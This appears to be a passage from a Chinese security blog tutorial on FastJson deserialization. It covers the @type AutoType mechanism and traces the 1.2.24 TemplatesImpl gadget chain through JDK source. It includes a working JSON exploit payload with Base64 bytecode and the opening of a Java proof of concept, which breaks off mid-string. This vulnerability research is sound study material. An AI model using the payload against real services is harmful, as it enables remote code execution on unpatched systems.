class="line">        System.out.println(<span class="string">&quot;get age&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no parameter construct</span></span><br><span class="line"><span class="comment">// get age</span></span><br><span class="line"><span class="comment">// set name</span></span><br></pre></td></tr></table></figure>
<p>在指定了目标类后，反序列化会调用当中的 <strong>set</strong>
方法和特殊 <strong>getter</strong> 方法。</p>
<h3 id="json.parseobjectstr">JSON.parseObject(str)</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> AtomicInteger age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;no parameter construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;south\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> AtomicInteger <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get age&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(AtomicInteger age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set age&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// no parameter construct</span></span><br><span class="line"><span class="comment">// set age</span></span><br><span class="line"><span class="comment">// set name</span></span><br><span class="line"><span class="comment">// get age</span></span><br><span class="line"><span class="comment">// get name</span></span><br></pre></td></tr></table></figure>
<p>而不指定目标类时，会调用全部的 <strong>get/set/construct</strong>
方法，而如果存在特殊 <strong>getter</strong> 方法，则原本调用
<strong>set</strong> 方法的地方会调用 <strong>get</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> AtomicInteger age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;no parameter construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;south\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> AtomicInteger <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get age&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// no parameter construct</span></span><br><span class="line"><span class="comment">// get age</span></span><br><span class="line"><span class="comment">// set name</span></span><br><span class="line"><span class="comment">// get age</span></span><br><span class="line"><span class="comment">// get name</span></span><br></pre></td></tr></table></figure>
<h3 id="json.parsestr">JSON.parse(str)</h3>
<p>同 <strong>JSON.parseObject(str,
Object.class)</strong>，不同之处在于会调解析字符串中 <strong><span
class="citation" data-cites="type">@type</span></strong> 指定的类。</p>
<h2 id="autotype-机制">AutoType 机制</h2>
<p>若一个类中包含了一个<strong>接口/抽象类</strong>，则在使用
<strong>FastJson</strong>
进行对其进行序列化的时候，子类型会被抹去，只保留抽象类接口的类型，因此反序列化时无法拿到原始类型。</p>
<p>而 <strong>AutoType</strong>，可以在序列化的时候，把原始类型通过
<strong>SerializerFeature.WriteClassName</strong> 进行标记。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    System.out.println(JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br><span class="line">    System.out.println(JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">User</span>(), SerializerFeature.WriteClassName));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;&quot;age&quot;:18,&quot;name&quot;:&quot;south&quot;&#125;</span></span><br><span class="line"><span class="comment">// &#123;&quot;@type&quot;:&quot;User&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;south&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p>由此，<strong>Json</strong> 字符串中多出了一个 <strong><span
class="citation" data-cites="type">@type</span></strong>
字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型。</p>
<p>即在对 <strong>Json</strong>
字符串解析的时候，会把字符串反序列化成读取到的 <strong><span
class="citation" data-cites="type">@type</span></strong>
字段的类，并调用这个类的 <strong>setter</strong> 方法。</p>
<p>因此在处理 <strong>Json</strong> 对象的时候，未对 <strong><span
class="citation" data-cites="type">@type</span></strong>
字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程
<strong>RMI</strong> 主机，通过其中的恶意类执行代码。</p>
<h2 id="supportnonpublicfield">SupportNonPublicField</h2>
<p>如果目标类中私有变量没有 <strong>setter</strong>
方法，但是在反序列化时仍想给这个变量赋值，则需要使用
<strong>Feature.SupportNonPublicField</strong> 参数。</p>
<h2 id="base64">Base64</h2>
<p><strong>FastJson</strong> 在反序列化时，如果 <strong>Field</strong>
类型为 <strong>byte[]</strong>，将会调用
<strong>com.alibaba.fastjson.parser.JSONScanner#bytesValue</strong> 进行
<strong>Base64</strong> 解码，对应的，在序列化时也会进行
<strong>Base64</strong> 编码。</p>
<h2 id="smartmatch">smartMatch</h2>
<p><strong>FastJson</strong> 在为类属性寻找
<strong>getter/setter</strong> 方法时，调用函数
<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</strong>
方法，会忽略 <strong>"_"</strong>、<strong>"-"</strong> 字符串。</p>
<p>例如字段名为 <strong>_a_g_e_</strong>，<strong>getter</strong> 方法为
<strong>getAge</strong>，<strong>FastJson</strong> 也可以找到，在
<strong>1.2.36</strong> 版本及后续版本还可以支持同时组合混淆。</p>
<h1 id="漏洞分析">漏洞分析</h1>
<h2 id="section">1.2.24</h2>
<h3 id="简介">简介</h3>
<p><strong>FastJson &lt;= 1.2.24</strong> 均生效。</p>
<p>反序列化漏洞首曝。</p>
<h3 id="templatesimpl">TemplatesImpl</h3>
<h4 id="分析">分析</h4>
<p>调用关系如下。</p>
<div id="flowchart-0" class="flow-chart">

</div>
<p>首先要关注的是 <strong><a
href="/Study-Unserialize-Java/#newinstance">newInstance</a></strong>
方法，可以看到，<strong>TemplatesImpl</strong> 链中的
<strong>getTransletInstance</strong>
方法涉及到相关操作，<strong>12</strong> 行处 <strong>_class</strong> 取
<strong>_transletIndex</strong> 下标进行了实例化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">            NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查找调用关系，可以发现 <strong>newTransformer</strong> 方法在第
<strong>7</strong> 行调用了 <strong>getTransletInstance</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进查看调用关系，发现 <strong>getOutputProperties</strong>
方法满足上文介绍的 <strong>Getter</strong> 方法。</p>
<p><img
src="/images/Study-Unserialize-FastJson/image-20230705202402442.png" /></p>
<p><strong>getOutputProperties</strong> 在第 <strong>4</strong> 行调用
<strong>newTransformer</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>确认 <strong>getOutputProperties</strong> 是
<strong>_outputProperties</strong> 的 <strong>getter</strong> 方法，而
<strong>_outputProperties</strong> 是 <strong>TemplatesImpl</strong>
链的成员变量。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Properties _outputProperties;</span><br></pre></td></tr></table></figure>
<p>确定了调用链的前段，接下来还需要寻找 <strong>_class</strong>
在何处可控，继续跟进，发现 <strong>_class</strong> 在
<strong>readObject</strong>、<strong>construction</strong>、<strong>defineTransletClasses</strong>
等方法中均有赋值调用。</p>
<p><img
src="/images/Study-Unserialize-FastJson/image-20230703230057984.png" /></p>
<p>回过头看一开始的 <strong>getTransletInstance</strong> 方法，发现在第
<strong>7</strong> 行处，满足 <strong>_class</strong> 为空即可调用
<strong>defineTransletClasses</strong>，同时要求 <strong>_name</strong>
不为空。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在 <strong>defineTransletClasses</strong> 中，第 <strong>5</strong>
行要求 <strong>_bytecodes</strong> 不为空，然后第 <strong>19</strong> 行
<strong>loader.defineClass</strong> 加载
<strong>_bytecodes</strong>。</p>
<p>然后第 <strong>23</strong> 行判断如果 <strong>_class[i]</strong>
的父类是 <strong>ABSTRACT_TRANSLET</strong>，则有 <strong>_transletIndex
= i</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后回到 <strong>getTransletInstance</strong> 方法，此时第
<strong>12</strong> 行 <strong>_transletIndex</strong> 为上文中
<strong>_class[i]</strong> 的下标，因此 <strong>_bytecodes</strong> 得以
<strong>newInstance</strong> 实例化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="额外的要求">额外的要求</h4>
<p>实际上在 <strong>defineTransletClasses</strong> 方法中，对
<strong>_tfactory</strong> 也同样有着要求，<strong>13</strong>
行处调用了 <strong>getExternalExtensionsMap</strong> 方法，这是
<strong>TransformerFactoryImpl</strong> 类的实现方法，也是
<strong>_tfactory</strong> 的变量类型，因此此处如果为空，则会报错。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是实际上可以传递空对象 <strong>{}</strong>，因为
<strong>Json</strong> 中 <strong>{}</strong> 表示
<strong>object</strong>，因此得以进入 <strong>deserialze</strong>
方法，在第 <strong>8</strong> 行出判定 <strong>object</strong>
为空，然后调用 <strong>createInstance</strong> 方法根据设定的变量类型
<strong>TransformerFactoryImpl</strong> 创建一个新的对象，从而执行上文的
<strong>getExternalExtensionsMap</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, // </span></span><br><span class="line"><span class="params">                           Type type, // </span></span><br><span class="line"><span class="params">                           Object fieldName, // </span></span><br><span class="line"><span class="params">                           Object object, //</span></span><br><span class="line"><span class="params">                           <span class="type">int</span> features)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fieldValues == <span class="literal">null</span>) &#123;</span><br><span class="line">            object = createInstance(parser, type);</span><br><span class="line">            <span class="keyword">if</span> (childContext == <span class="literal">null</span>) &#123;</span><br><span class="line">                childContext = parser.setContext(context, object, fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> (T) object;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外，<strong>_bytecodes</strong> 在反序列化的时候，会经由
<strong>deserialze</strong> 方法在第 <strong>5</strong> 行调用
<strong>bytesValue</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ObjectArrayCodec (com.alibaba.fastjson.serializer)</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = lexer.bytesValue();</span><br><span class="line">                lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">                <span class="keyword">return</span> (T) bytes;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>bytesValue</strong> 做了 <strong>Base64</strong>
解码，因此对于传入的 <strong>_bytecodes</strong> 需要经
<strong>Base64</strong> 编码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] bytesValue() &#123;</span><br><span class="line">    <span class="keyword">return</span> IOUtils.decodeBase64(buf, np + <span class="number">1</span>, sp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="总结">总结</h4>
<p><strong>_bytecodes</strong> 需要是一个 <strong>Base64</strong>
编码的字节码数组，这样才可以在 <strong>defineTransletClasses</strong>
方法的 <strong>for</strong> 循环中被赋值，然后在
<strong>getTransletInstance</strong> 方法中被
<strong>newInstance</strong> 方法执行恶意代码。</p>
<p><strong>_name</strong> 不能为空，<strong>_tfactory</strong> 需要是空
<strong>object</strong>，**_outputProperties** 需要触发
<strong>getOutputProperties</strong> 因此同样需要是空
<strong>object</strong>。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAHAEABFRlc3QHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAcBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABBqYXZhL2xhbmcvU3lzdGVtBwAMAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07DAAOAA8JAA0AEAgAAQEAE2phdmEvaW8vUHJpbnRTdHJlYW0HABMBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAVABYKABQAFwEABjxpbml0PgwAGQAKCgAIABoAIQACAAgAAAAAAAIACAAJAAoAAQALAAAAFQACAAAAAAAJsgAREhK2ABixAAAAAAABABkACgABAAsAAAARAAEAAQAAAAUqtwAbsQAAAAAAAQAFAAAAAgAG&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="例子">例子</h4>
<p><strong>SupportNonPublicField</strong>
的开启条件在上文有提到，是当目标类中私有变量没有 <strong>setter</strong>
方法，但反序列化时仍想给这个变量赋值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: 